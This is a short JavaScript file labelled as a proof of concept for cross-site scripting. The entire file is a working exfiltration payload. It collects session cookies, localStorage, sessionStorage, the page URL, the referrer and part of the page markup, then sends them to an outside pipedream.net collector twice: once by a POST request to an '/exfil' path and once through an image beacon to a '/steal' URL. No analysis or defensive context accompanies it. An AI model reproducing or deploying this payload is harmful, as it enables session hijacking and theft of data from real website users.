// POC
(function() {
    var cookies = document.cookie;
    
    var sessionData = {
        cookie: cookies,
        url: window.location.href,
        referrer: document.referrer,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        dom: document.documentElement.innerHTML.substring(0, 1000)
    };
    
    fetch('https://eoow6y96ffo9mzx.m.pipedream.net/exfil', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(sessionData)
    });
    
    var exfilUrl = 'https://eoow6y96ffo9mzx.m.pipedream.net/steal?cookie=' + 
                   encodeURIComponent(cookies) + 
                   '&url=' + encodeURIComponent(window.location.href);
    
    var img = new Image();
    img.src = exfilUrl;
    document.body.appendChild(img);
    
    console.log('[XSS] Test');
    console.log('[XSS] Cookies:', cookies);
})();
